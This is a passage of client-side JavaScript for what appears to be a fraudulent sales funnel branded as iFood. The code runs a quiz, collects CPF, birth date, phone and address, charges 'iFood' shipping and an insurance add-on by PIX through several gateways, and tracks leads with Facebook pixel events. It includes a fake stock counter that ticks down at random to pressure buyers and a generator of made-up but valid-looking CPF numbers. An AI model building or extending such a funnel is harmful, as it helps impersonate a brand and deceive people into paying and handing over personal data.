        if (loginError) loginError.classList.add('hidden');
        const password = passwordInput?.value || '';
        const res = await adminFetch('/api/admin/login', {
            method: 'POST',
            body: JSON.stringify({ password })
        });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            if (loginError) {
                loginError.textContent = detail?.error || 'Senha invalida.';
                loginError.classList.remove('hidden');
            }
            return;
        }
        setLoginVisible(false);
        if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) await loadSettings();
        if (wantsLeads) await loadLeads({ reset: true });
        if (wantsPages) await loadPageCounts();
        if (wantsBackredirects) await loadBackredirects();
    });

    saveBtn?.addEventListener('click', saveSettings);
    leadsRefresh?.addEventListener('click', () => loadLeads({ reset: true }));
    leadsMore?.addEventListener('click', () => loadLeads({ reset: false }));
    leadsSearch?.addEventListener('change', () => loadLeads({ reset: true }));
    leadsReconcile?.addEventListener('click', reconcilePix);
    testPixelBtn?.addEventListener('click', runPixelTest);
    testUtmfyBtn?.addEventListener('click', runUtmfyTest);
    saleUtmfyBtn?.addEventListener('click', runUtmfySale);
    testPushcutBtn?.addEventListener('click', runPushcutTest);
    processDispatchBtn?.addEventListener('click', runDispatchProcess);
    paymentsActiveGateway?.addEventListener('change', () => {
        const selected = normalizeGatewayKey(paymentsActiveGateway?.value || 'ativushub');
        setCurrentGatewayCard(selected);
        setGatewayCardOpen(selected, true);
        if (metricActiveGateway) {
            metricActiveGateway.textContent = gatewayLabelForUi(selected);
        }
    });
    gatewayAtivushubEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayGhostspayEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewaySunizeEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayParadiseEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayConfigToggles.forEach((button) => {
        button.addEventListener('click', () => {
            const gateway = button.getAttribute('data-gateway-config-toggle') || 'ativushub';
            toggleGatewayCard(gateway);
        });
    });

    navItems.forEach((item) => {
        const itemPage = item.getAttribute('data-admin');
        if (itemPage && itemPage === adminPage) {
            item.classList.add('is-active');
        }
        item.addEventListener('click', (event) => {
            const target = item.getAttribute('data-target');
            if (!target) return;
            event.preventDefault();
            navItems.forEach((btn) => btn.classList.remove('is-active'));
            item.classList.add('is-active');
            const section = document.getElementById(target);
            if (section) section.scrollIntoView({ behavior: 'smooth', block: 'start' });
        });
    });

    if (hasPaymentsForm) {
        const selected = normalizeGatewayKey(paymentsActiveGateway?.value || 'ativushub');
        syncGatewaySwitches();
        setCurrentGatewayCard(selected);
        setGatewayCardOpen(selected, true);
    }

    checkAuth().then((ok) => {
        if (ok) {
            setLoginVisible(false);
            if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) loadSettings();
            if (wantsLeads) loadLeads({ reset: true });
            if (wantsPages) loadPageCounts();
            if (wantsBackredirects) loadBackredirects();
            // Keep overview fresh without manual reload.
            const refreshIntervalMs = 10000;
            setInterval(() => {
                if (document.visibilityState !== 'visible') return;
                if (wantsLeads) loadLeads({ reset: true });
                if (wantsPages) loadPageCounts();
                if (wantsBackredirects) loadBackredirects();
            }, refreshIntervalMs);
        } else {
            setLoginVisible(true);
        }
    });
}

function renderQuestion(questionConfig, refs) {
    const { questionText, optionsContainer, questionCount, progressFill } = refs;

    questionText.innerText = questionConfig.text;
    optionsContainer.innerHTML = '';

    questionConfig.options.forEach((opt) => {
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'option-btn';
        btn.innerHTML = `<span class="icon">${opt.icon}</span> ${opt.text}`;
        btn.addEventListener('click', () => handleAnswer(btn, opt, refs));
        optionsContainer.appendChild(btn);
    });

    updateProgress(questionCount, progressFill);
}

function handleAnswer(btnElement, option, refs) {
    if (state.answerLocked) return;
    state.answerLocked = true;

    const allBtns = document.querySelectorAll('.option-btn');
    allBtns.forEach((b) => {
        b.classList.remove('selected');
        b.disabled = true;
    });

    btnElement.classList.add('selected');

    setTimeout(() => {
        if (option.next === 'personal_step') {
            saveQuizComplete();
            setStage('personal');
            redirect('dados.html');
            return;
        }

        state.currentStepIndex += 1;
        state.currentQuestionKey = option.next;
        state.totalSteps = Math.max(
            state.currentStepIndex,
            (state.currentStepIndex - 1) + maxPathLengthFrom(state.currentQuestionKey)
        );

        if (!questions[state.currentQuestionKey]) {
            showToast('Ocorreu um erro ao carregar a próxima pergunta.', 'error');
            state.answerLocked = false;
            return;
        }

        renderQuestion(questions[state.currentQuestionKey], refs);
        state.answerLocked = false;
    }, 300);
}

function updateProgress(questionCount, progressFill) {
    const total = Math.max(state.totalSteps, state.currentStepIndex);
    questionCount.innerText = `PERGUNTA ${state.currentStepIndex} DE ${total}`;
    const progressPct = (state.currentStepIndex / total) * 100;
    progressFill.style.width = `${Math.min(progressPct, 100)}%`;
}

function maxPathLengthFrom(key) {
    if (!key || key === 'personal_step') return 0;
    if (pathMemo[key]) return pathMemo[key];
    const q = questions[key];
    if (!q || !Array.isArray(q.options) || q.options.length === 0) return 0;
    const maxNext = Math.max(...q.options.map((opt) => maxPathLengthFrom(opt.next)));
    const length = 1 + (Number.isFinite(maxNext) ? maxNext : 0);
    pathMemo[key] = length;
    return length;
}

function initStockCounter() {
    if (!dom.stockCounter) return;
    const stored = Number(sessionStorage.getItem(STORAGE_KEYS.stock) || 8);
    let stock = Number.isFinite(stored) && stored > 0 ? stored : 8;

    dom.stockCounter.innerText = stock;

    const tick = () => {
        if (stock > 3) {
            stock -= 1;
            sessionStorage.setItem(STORAGE_KEYS.stock, String(stock));
            dom.stockCounter.innerText = stock;
            dom.stockCounter.style.color = '#ffeb3b';
            setTimeout(() => {
                dom.stockCounter.style.color = 'white';
            }, 500);
            setTimeout(tick, Math.random() * 8000 + 4000);
        }
    };

    setTimeout(tick, 5000);
}

function maskCPF(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 11) v = v.slice(0, 11);
    v = v.replace(/(\d{3})(\d)/, '$1.$2');
    v = v.replace(/(\d{3})(\d)/, '$1.$2');
    v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    input.value = v;
}

function maskDate(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 8) v = v.slice(0, 8);
    v = v.replace(/(\d{2})(\d)/, '$1/$2');
    v = v.replace(/(\d{2})(\d)/, '$1/$2');
    input.value = v;
}

function maskPhone(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 11) v = v.slice(0, 11);
    if (v.length <= 2) {
        input.value = v;
        return;
    }
    if (v.length <= 6) {
        input.value = `(${v.slice(0, 2)}) ${v.slice(2)}`;
        return;
    }
    if (v.length <= 10) {
        input.value = `(${v.slice(0, 2)}) ${v.slice(2, 6)}-${v.slice(6)}`;
        return;
    }
    input.value = `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7)}`;
}

function maskCep(input) {
    if (!input) return;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    if (value.length > 5) {
        value = `${value.slice(0, 5)}-${value.slice(5)}`;
    }
    input.value = value;
}

function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    if (!cpf || cpf.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cpf)) return false;

    let add = 0;
    for (let i = 0; i < 9; i += 1) add += parseInt(cpf.charAt(i), 10) * (10 - i);
    let rev = 11 - (add % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cpf.charAt(9), 10)) return false;

    add = 0;
    for (let i = 0; i < 10; i += 1) add += parseInt(cpf.charAt(i), 10) * (11 - i);
    rev = 11 - (add % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cpf.charAt(10), 10)) return false;

    return true;
}

function isValidDate(value) {
    const match = value.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
    if (!match) return false;

    const day = parseInt(match[1], 10);
    const month = parseInt(match[2], 10);
    const year = parseInt(match[3], 10);

    const now = new Date();
    const currentYear = now.getFullYear();

    if (year < 1900 || year > currentYear) return false;

    const date = new Date(year, month - 1, day);
    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) return false;
    if (date > now) return false;

    return true;
}

function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function isValidPhone(value) {
    const digits = value.replace(/\D/g, '');
    return digits.length >= 10 && digits.length <= 11;
}

function formatCep(rawCep) {
    if (!rawCep || rawCep.length !== 8) return rawCep || '-';
    return `${rawCep.slice(0, 5)}-${rawCep.slice(5)}`;
}

function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

function formatDateTime(value) {
    if (!value) return '-';
    const d = new Date(value);
    if (!Number.isNaN(d.getTime())) {
        return d.toLocaleString('pt-BR');
    }
    return String(value || '').trim() || '-';
}

function roundMoney(value) {
    return Math.round(Number(value || 0) * 100) / 100;
}

function saveCoupon(data) {
    localStorage.setItem(STORAGE_KEYS.coupon, JSON.stringify(data));
}

function loadCoupon() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.coupon);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function clearCoupon() {
    localStorage.removeItem(STORAGE_KEYS.coupon);
}

function buildShippingOptions(rawCep) {
    const coupon = loadCoupon();
    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
    const baseOptions = [
        {
            id: 'economico',
            name: 'Envio Econômico iFood',
            price: 19.9,
            eta: '5 a 8 dias úteis'
        },
        {
            id: 'padrao',
            name: 'Envio Padrão iFood',
            price: 25.9,
            eta: '3 a 5 dias úteis'
        },
        {
            id: 'expresso',
            name: 'Envio Prioritário iFood',
            price: 29.9,
            eta: '1 a 3 dias úteis'
        }
    ];

    return baseOptions.map((opt) => {
        const original = Number(opt.price || 0);
        const discounted = amountOff ? Math.max(0, roundMoney(original - amountOff)) : original;
        return {
            ...opt,
            originalPrice: amountOff ? original : null,
            price: discounted,
            discountApplied: amountOff > 0
        };
    });
}

function saveShipping(data) {
    localStorage.setItem(STORAGE_KEYS.shipping, JSON.stringify(data));
}

function loadShipping() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.shipping);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function isShippingSelectionComplete(shipping) {
    if (!shipping || typeof shipping !== 'object') return false;
    const shippingId = String(shipping.id || '').trim();
    const shippingPrice = Number(shipping.price);
    const selectedAt = Number(shipping.selectedAt || 0);
    if (!shippingId) return false;
    if (!Number.isFinite(shippingPrice) || shippingPrice < 0) return false;
    if (!selectedAt || Number.isNaN(selectedAt)) return false;
    return true;
}

function applyCouponToShipping(shipping) {
    if (!shipping) return shipping;
    const coupon = loadCoupon();
    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
    if (!amountOff) return shipping;
    const base = Number(shipping.originalPrice || shipping.basePrice || shipping.price || 0);
    const discounted = Math.max(0, roundMoney(base - amountOff));
    if (discounted === shipping.price && shipping.coupon === coupon.code) return shipping;
    const updated = {
        ...shipping,
        basePrice: base,
        originalPrice: base,
        price: discounted,
        coupon: coupon.code || 'FRETE5',
        amountOff,
        discountApplied: true
    };
    saveShipping(updated);
    return updated;
}

function saveAddressExtra(data) {
    localStorage.setItem(STORAGE_KEYS.addressExtra, JSON.stringify(data));
}

function loadAddressExtra() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.addressExtra);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveBump(data) {
    localStorage.setItem(STORAGE_KEYS.bump, JSON.stringify(data));
}

function loadBump() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.bump);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function generateFallbackCpf(seedText) {
    const seed = String(seedText || Date.now()).replace(/\D/g, '') || '123456789';
    const digits = seed.padEnd(9, '7').slice(0, 9).split('').map((n) => Number(n));
    const calc = (base, factor) => {
        const sum = base.reduce((acc, value, index) => acc + value * (factor - index), 0);
        const mod = sum % 11;
        return mod < 2 ? 0 : 11 - mod;
    };
    const d10 = calc(digits, 10);
    const d11 = calc([...digits, d10], 11);
    return `${digits.join('')}${d10}${d11}`;
}

function getPixPersonalPayload() {
    const sessionId = getLeadSessionId();
    const personal = loadPersonal() || {};
    const phoneDigits = String(personal.phoneDigits || personal.phone || '').replace(/\D/g, '');
    const cpfDigits = String(personal.cpf || '').replace(/\D/g, '');
    const suffix = String(sessionId || Date.now()).replace(/[^a-zA-Z0-9]/g, '').slice(-8).toLowerCase() || 'lead';
    const fallbackEmail = `lead.${suffix}@ifoodbag.app`;

    return {
        name: String(personal.name || '').trim() || 'Cliente iFood',
        cpf: cpfDigits || generateFallbackCpf(sessionId),
        birth: String(personal.birth || '').trim() || '01/01/1990',
        email: String(personal.email || '').trim() || fallbackEmail,
        phone: String(personal.phone || '').trim() || '(11) 99999-9999',
        phoneDigits: phoneDigits || '11999999999'
    };
}

function getPixAddressPayload() {
    const address = loadAddress() || {};
    const cityLine = String(address.cityLine || '');
    const stateFromLine = cityLine.includes('-') ? cityLine.split('-')[1]?.trim() : '';
    const cityFromLine = cityLine.includes('-') ? cityLine.split('-')[0]?.trim() : cityLine.trim();
    return {
        ...address,
        cep: String(address.cep || '').trim(),
        street: String(address.street || '').trim() || String(address.streetLine || '').split(',')[0]?.trim() || 'Rua não informada',
        neighborhood: String(address.neighborhood || '').trim() || String(address.streetLine || '').split(',')[1]?.trim() || 'Centro',
        city: String(address.city || '').trim() || cityFromLine || 'Sao Paulo',
        state: String(address.state || '').trim() || stateFromLine || 'SP'
    };
}

function normalizeApiErrorMessage(message = '') {
    const text = String(message || '').trim();
    if (!text) return '';
    const lower = text.toLowerCase();
    if (lower.includes('sess') && (lower.includes('inv') || lower.includes('invalid'))) {
        return 'Sessao invalida. Recarregue a pagina.';
    }
    return text;
}

function looksLikeSessionError(message = '') {
    const normalized = String(message || '').toLowerCase();
    return normalized.includes('sess') && (normalized.includes('inv') || normalized.includes('invalid'));
}

function normalizePixLifecycleStatus(value = '') {
    return String(value || '')
        .trim()
        .toLowerCase()
        .replace(/\s+/g, '_')
        .replace(/-+/g, '_');
}

function canReuseRecentPixCharge(pixData, expected = {}) {
    if (!pixData || typeof pixData !== 'object') return false;

    const txid = String(pixData.idTransaction || pixData.txid || '').trim();
    if (!txid) return false;

    const status = normalizePixLifecycleStatus(
        pixData.status || pixData.statusRaw || pixData.status_transaction || ''
    );
    if (
        pixData.paidAt ||
        status === 'paid' ||
        status === 'refunded' ||
        status === 'refused' ||
        status === 'failed' ||
        status === 'expired' ||
        status === 'canceled' ||
        status === 'cancelled' ||
        status === 'chargedback' ||
        status === 'chargeback'
    ) {
        return false;
    }

    const createdAt = Number(pixData.createdAt || 0);
    if (!createdAt || Number.isNaN(createdAt)) return false;
    if (Date.now() - createdAt > (20 * 60 * 1000)) return false;

    const expectedAmount = Number(expected.amount || 0);
    const storedAmount = Number(pixData.amount || 0);
    if (expectedAmount > 0 && storedAmount > 0 && Math.abs(storedAmount - expectedAmount) > 0.01) {
        return false;
    }

    const expectedShipping = String(expected.shippingId || '').trim();
    const storedShipping = String(pixData.shippingId || '').trim();
    if (expectedShipping && storedShipping && expectedShipping !== storedShipping) {
        return false;
    }

    if (Boolean(expected.isUpsell) !== Boolean(pixData.isUpsell)) {
        return false;
    }

    return true;
}

async function postPixCreateWithSessionRetry(payload) {
    const send = async () => {
        const response = await fetch('/api/pix/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'same-origin',
            body: JSON.stringify(payload)
        });
        const body = await response.json().catch(() => ({}));
        return { response, body };
    };

    let attempt = await send();
    const firstError = String(attempt?.body?.error || '').trim();
    if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
        await ensureApiSession(true).catch(() => null);
        attempt = await send();
    }

    return attempt;
}

function loadPixCreateLock() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.pixCreateLock);
        if (!raw) return null;
        const parsed = JSON.parse(raw);
        if (!parsed || typeof parsed !== 'object') return null;
        const key = String(parsed.key || '').trim();
        const expiresAt = Number(parsed.expiresAt || 0);
        if (!key || !expiresAt || Number.isNaN(expiresAt)) return null;
        if (expiresAt <= Date.now()) {
            localStorage.removeItem(STORAGE_KEYS.pixCreateLock);
            return null;
        }
        return { key, expiresAt };
    } catch (_error) {
        return null;
    }
}

function savePixCreateLock(lockKey) {
    if (!lockKey) return;
    const payload = {
        key: String(lockKey),
        expiresAt: Date.now() + 25000
    };
    try {
        localStorage.setItem(STORAGE_KEYS.pixCreateLock, JSON.stringify(payload));
    } catch (_error) {
        // Ignore localStorage write errors.
    }
}

function clearPixCreateLock(lockKey = '') {
    const key = String(lockKey || '').trim();
    try {
        const current = loadPixCreateLock();
        if (!current) return;
        if (!key || current.key === key) {
            localStorage.removeItem(STORAGE_KEYS.pixCreateLock);
        }
    } catch (_error) {
        // Ignore localStorage write errors.
    }
}

async function createPixCharge(shipping, bumpPrice, options = {}) {
    const isUpsell = Boolean(options?.upsell?.enabled);
    const shippingInput = shipping && typeof shipping === 'object' ? { ...shipping } : null;
    const shippingForPix = isUpsell ? shippingInput : applyCouponToShipping(shippingInput);
    const shippingPrice = Number(shippingForPix?.price || 0);
    if (!shippingForPix || !Number.isFinite(shippingPrice) || shippingPrice < 0) {
        throw new Error('Selecione um frete valido antes de gerar o PIX.');
    }
    const extraChargeRaw = Number(bumpPrice || 0);
    const extraCharge = Number.isFinite(extraChargeRaw) && extraChargeRaw > 0
        ? Number(extraChargeRaw.toFixed(2))
        : 0;
    const amount = Number((shippingPrice + extraCharge).toFixed(2));
    const sessionId = getLeadSessionId();
    const lockKey = [
        sessionId,
        isUpsell ? 'upsell' : 'base',
        String(shippingForPix?.id || ''),
        String(amount.toFixed(2))
    ].join('|');

    const cachedPix = loadPix();
    if (canReuseRecentPixCharge(cachedPix, { amount, shippingId: shippingForPix?.id || '', isUpsell })) {
        setStage('pix');
        redirect('pix.html');
        return;
    }

    const existingPixCreateLock = loadPixCreateLock();
    if (existingPixCreateLock && existingPixCreateLock.key === lockKey) {
        throw new Error('Estamos finalizando seu PIX. Aguarde alguns segundos.');
    }

    if (
        state.pixCreatePromise &&
        state.pixCreateKey === lockKey &&
        (Date.now() - Number(state.pixCreateAt || 0)) < 20000
    ) {
        return state.pixCreatePromise;
    }
    savePixCreateLock(lockKey);

    const run = (async () => {
        await ensureApiSession();

        const trackEventRequested = isUpsell ? 'upsell_pix_create_requested' : 'pix_create_requested';
        const trackEventCreated = isUpsell ? 'upsell_pix_created_front' : 'pix_created_front';
        const payload = {
            sessionId,
            amount,
            stage: isUpsell ? 'upsell' : 'pix',
            event: trackEventRequested,
            sourceUrl: window.location.href,
            utm: getUtmData(),
            shipping: shippingForPix,
            bump: extraCharge > 0 ? { title: 'Seguro Bag', price: extraCharge } : null,
            personal: getPixPersonalPayload(),
            address: getPixAddressPayload(),
            extra: loadAddressExtra(),
            sourceStage: String(options?.sourceStage || ''),
            upsell: isUpsell ? {
                enabled: true,
                kind: String(options?.upsell?.kind || 'frete_1dia'),
                title: String(options?.upsell?.title || 'Prioridade de envio'),
                price: Number(options?.upsell?.price || extraCharge || shippingPrice || 0),
                previousTxid: String(options?.upsell?.previousTxid || '')
            } : null
        };

        const { response: res, body: data } = await postPixCreateWithSessionRetry(payload);
        if (!res.ok) {
            const message = normalizeApiErrorMessage(data?.error || '') || 'Falha ao gerar o PIX. Tente novamente em instantes.';
            trackLead(isUpsell ? 'upsell_pix_create_failed' : 'pix_create_failed', {
                stage: isUpsell ? 'upsell' : 'orderbump',
                shipping: shippingForPix,
                bump: payload.bump,
                amount
            });
            throw new Error(message);
        }

        const pixPayload = {
            ...data,
            amount,
            shippingId: shippingForPix.id,
            shippingName: shippingForPix.name,
            bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
            bumpPrice: extraCharge,
            createdAt: Date.now(),
            isUpsell,
            upsell: payload.upsell
        };
        savePix(pixPayload);
        setStage('pix');
        trackLead(trackEventCreated, {
            stage: 'pix',
            shipping: shippingForPix,
            bump: payload.bump,
            pix: pixPayload,
            amount
        });
        redirect('pix.html');
    })();

    state.pixCreatePromise = run;
    state.pixCreateKey = lockKey;
    state.pixCreateAt = Date.now();

    return run.finally(() => {
        clearPixCreateLock(lockKey);
        if (state.pixCreateKey === lockKey) {
            state.pixCreatePromise = null;
            state.pixCreateKey = '';
            state.pixCreateAt = 0;
        }
    });
}

function savePix(data) {
    localStorage.setItem(STORAGE_KEYS.pix, JSON.stringify(data));
}

function loadPix() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.pix);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function getLeadSessionId() {
    let sessionId = localStorage.getItem(STORAGE_KEYS.leadSession) || '';
    if (sessionId) return sessionId;

    sessionId = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
    localStorage.setItem(STORAGE_KEYS.leadSession, sessionId);
    return sessionId;
}

async function ensureApiSession(force = false) {
    const now = Date.now();
    const maxAgeMs = 50 * 60 * 1000;
    if (!force && state.apiSessionAt && now - state.apiSessionAt < maxAgeMs) {
        return true;
    }

    if (state.apiSessionPromise) {
        return state.apiSessionPromise;
    }

    state.apiSessionPromise = fetch('/api/site/session', {
        method: 'GET',
        cache: 'no-store',
        credentials: 'same-origin'
    })
        .then((res) => {
            if (!res.ok) throw new Error('Falha ao iniciar sessão segura.');
            state.apiSessionAt = Date.now();
            return true;
        })
        .finally(() => {
            state.apiSessionPromise = null;
        });

    return state.apiSessionPromise;
}

function captureUtmParams() {
    const params = new URLSearchParams(window.location.search);
    const current = getUtmData();
    const updated = {
        src: params.get('src') || current.src,
        sck: params.get('sck') || current.sck,
        utm_source: params.get('utm_source') || current.utm_source,
        utm_medium: params.get('utm_medium') || current.utm_medium,
        utm_campaign: params.get('utm_campaign') || current.utm_campaign,
        utm_term: params.get('utm_term') || current.utm_term,
        utm_content: params.get('utm_content') || current.utm_content,
        gclid: params.get('gclid') || current.gclid,
        fbclid: params.get('fbclid') || current.fbclid,
        ttclid: params.get('ttclid') || current.ttclid,
        referrer: document.referrer || current.referrer,
        landing_page: current.landing_page || window.location.pathname
    };
    localStorage.setItem(STORAGE_KEYS.utm, JSON.stringify(updated));
}

function trackPageView(page) {
    if (!page) return;
    ensureApiSession().then(() => {
        fetch('/api/lead/pageview', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: getLeadSessionId(),
                page,
                sourceUrl: window.location.href,
                utm: getUtmData()
            }),
            keepalive: true
        }).catch(() => null);
    }).catch(() => null);
}

function getUtmData() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.utm);
        return raw ? JSON.parse(raw) : {};
    } catch (_error) {
        return {};
    }
}

async function ensureSiteConfig(force = false) {
    const now = Date.now();
    const maxAgeMs = 5 * 60 * 1000;
    if (!force && state.siteConfig && now - state.siteConfigAt < maxAgeMs) {
        return state.siteConfig;
    }
    try {
        const res = await fetch('/api/site/config', { cache: 'no-store' });
        if (!res.ok) throw new Error('config');
        const data = await res.json();
        state.siteConfig = data || {};
        state.siteConfigAt = Date.now();
        state.pixelConfig = data?.pixel || null;
        state.pixelConfigAt = Date.now();
        localStorage.setItem(STORAGE_KEYS.pixelConfig, JSON.stringify(state.pixelConfig));
        return state.siteConfig;
    } catch (_error) {
        try {
            const cached = localStorage.getItem(STORAGE_KEYS.pixelConfig);
            if (cached) {
                state.pixelConfig = JSON.parse(cached);
                return { pixel: state.pixelConfig };
            }
        } catch (_e) {}
        return null;
    }
}

async function ensurePixelConfig(force = false) {
    const site = await ensureSiteConfig(force);
    return site?.pixel || state.pixelConfig || null;
}

async function isOrderBumpEnabled() {
    const site = await ensureSiteConfig(false);
    const enabled = site?.features?.orderbump;
    return enabled !== false;
}

function loadFacebookPixel(pixelId) {
    const id = String(pixelId || '').trim();
    if (!id) return;

    if (!window.__ifoodPixelInits || typeof window.__ifoodPixelInits !== 'object') {
        window.__ifoodPixelInits = {};
    }

    /* eslint-disable */
    if (!window.fbq) {
        !function(f,b,e,v,n,t,s){
            if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)
        }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
    }
    /* eslint-enable */

    if (window.__ifoodPixelInits[id]) return;
    try {
        window.fbq('init', id);
        window.__ifoodPixelInits[id] = true;
    } catch (_error) {}
}

function getCookieValue(name) {
    const needle = `${name}=`;
    const chunks = String(document.cookie || '').split(';');
    for (const raw of chunks) {
        const item = raw.trim();
        if (!item.startsWith(needle)) continue;
        return decodeURIComponent(item.slice(needle.length));
    }
    return '';
}

function getPixelBrowserContext(utm = {}) {
    const fbclid = String(utm?.fbclid || '').trim();
    const fbp = String(getCookieValue('_fbp') || '').trim();
    const cookieFbc = String(getCookieValue('_fbc') || '').trim();
    const fbc = cookieFbc || (fbclid ? `fb.1.${Date.now()}.${fbclid}` : '');
    return { fbclid, fbp, fbc };
}

async function initMarketing() {
    const pixel = await ensurePixelConfig();
    if (pixel?.enabled && pixel.id) {
        loadFacebookPixel(pixel.id);
        if (pixel.events?.page_view !== false) {
            firePixelEvent('PageView');
        }
    }
}

function firePixelEvent(eventName, data = {}, options = {}) {
    if (!window.fbq) return;
    const pixelId = String(state.pixelConfig?.id || '').trim();
    const hasOptions = options && Object.keys(options).length > 0;
    try {
        if (pixelId) {
            if (hasOptions) {
                window.fbq('trackSingle', pixelId, eventName, data, options);
            } else {
                window.fbq('trackSingle', pixelId, eventName, data);
            }
            return;
        }

        if (hasOptions) {
            window.fbq('track', eventName, data, options);
        } else {
            window.fbq('track', eventName, data);
        }
    } catch (_error) {
        try {
            if (hasOptions) {
                window.fbq('track', eventName, data, options);
            } else {
                window.fbq('track', eventName, data);
            }
        } catch (_error2) {}
    }
}

function maybeTrackPixel(eventName, payload = {}) {
    const pixel = state.pixelConfig;
    if (!pixel || !pixel.enabled || !pixel.id) return;
    const explicitValue = Number(payload?.amount);
    const shippingValue = Number(payload?.shipping?.price || 0);
    const bumpValue = Number(payload?.bump?.price || 0);
    const computedValue = Number.isFinite(shippingValue + bumpValue)
        ? Number((shippingValue + bumpValue).toFixed(2))
        : 0;
    const totalValue = Number.isFinite(explicitValue) && explicitValue > 0 ? explicitValue : computedValue;
    const txid = String(payload?.pix?.idTransaction || payload?.pix?.idtransaction || '').trim();

    if (eventName === 'quiz_view' && pixel.events?.quiz_view !== false) {
        firePixelEvent('ViewContent', {
            content_name: 'quiz_ifood'
        });
    }

    if (eventName === 'personal_submitted' && pixel.events?.lead !== false) {
        firePixelEvent('Lead');
    }

    if (eventName === 'checkout_view' && pixel.events?.checkout !== false) {
        firePixelEvent('InitiateCheckout', {
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {})
        });
    }

    if (eventName === 'upsell_view' && pixel.events?.checkout !== false) {
        firePixelEvent('ViewContent', {
            content_name: 'upsell_frete_1dia',
            content_category: 'upsell'
        });
    }

    if (eventName === 'upsell_accept' && pixel.events?.checkout !== false) {
        firePixelEvent('AddToCart', {
            content_name: 'upsell_frete_1dia',
            currency: 'BRL',
            value: totalValue > 0 ? totalValue : 18.98
        });
    }

    if ((eventName === 'pix_created_front' || eventName === 'upsell_pix_created_front') && pixel.events?.checkout !== false) {
        firePixelEvent('AddPaymentInfo', {
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {}),
            content_name: String(payload?.shipping?.name || '')
        }, txid ? { eventID: txid } : {});
    }

    if (eventName === 'pix_paid' && pixel.events?.purchase !== false) {
        firePixelEvent('Purchase', {
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {}),
            content_name: String(payload?.shipping?.name || ''),
            content_category: payload?.isUpsell ? 'upsell' : 'checkout'
        }, txid ? { eventID: txid } : {});
    }
}

function trackLead(eventName, extra = {}) {
    ensureApiSession().catch(() => null);
    const utm = getUtmData();
    const pixelBrowser = getPixelBrowserContext(utm);

    const payload = {
        sessionId: getLeadSessionId(),
        event: eventName,
        stage: extra.stage || getStage() || '',
        page: document.body.dataset.page || '',
        sourceUrl: window.location.href,
        utm,
        fbclid: pixelBrowser.fbclid || undefined,
        fbp: pixelBrowser.fbp || undefined,
        fbc: pixelBrowser.fbc || undefined,
        personal: extra.personal || loadPersonal() || {},
        address: extra.address || loadAddress() || {},
        extra: extra.extra || loadAddressExtra() || {},
        shipping: extra.shipping || loadShipping() || {},
        bump: extra.bump || loadBump() || {},
        pix: extra.pix || loadPix() || {},
        quiz: extra.quiz || {},
        amount: Number.isFinite(Number(extra.amount)) ? Number(extra.amount) : undefined,
        isUpsell: extra.isUpsell === true
    };

    maybeTrackPixel(eventName, payload);

    try {
        const body = JSON.stringify(payload);
        if (navigator.sendBeacon) {
            const blob = new Blob([body], { type: 'application/json' });
            navigator.sendBeacon('/api/lead/track', blob);
            return;
        }
        fetch('/api/lead/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body,
            keepalive: true
        }).catch(() => null);
    } catch (_error) {
        // Tracking must never break the main flow.
    }
}

function setHidden(element, shouldHide) {
    if (!element) return;
    element.classList.toggle('hidden', shouldHide);
